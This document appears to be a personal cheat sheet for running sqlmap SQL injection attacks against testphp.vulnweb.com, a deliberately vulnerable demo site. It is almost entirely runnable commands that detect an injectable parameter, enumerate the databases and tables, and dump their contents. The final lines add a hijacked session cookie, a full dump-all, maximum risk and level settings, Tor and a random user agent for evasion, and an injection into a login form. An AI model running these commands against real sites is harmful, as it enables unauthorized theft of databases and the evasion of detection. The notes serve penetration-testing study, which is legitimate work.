



## Step 1

```sh
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
```

Result
- Vulneruble parameter
    - Type
    - Title
    - Payload
- back-end DBMS 
- Web application technology



## Step 2
```sh
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
```

Result
- database names

At this moment check which databases are default in this DBMS, leave them and 
dump non-default databases.

MySQL default databases
- mysql 
- information_schema
- performance_schema
- sys


## Step 3
```sh
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D <db-name> --tables
```

Result
- tables names for <db-name>


## Step 4
```sh
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D <db-name> --dump
```

Result
- dump of <db-name>


## -------------------------------------------------------------
- sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D <db-name> --cookie="security=low; PHPSESSID=13o5hlkjs3hur2pvnfkgim9t74" --dump-all --batch --output-dir="db-dump" --random-agent --risk=3 --level=5 --tor
- sqlmap -u .../login --data "username=a&password=b" -p username --dump --output-dir="db-dump"
Upload File
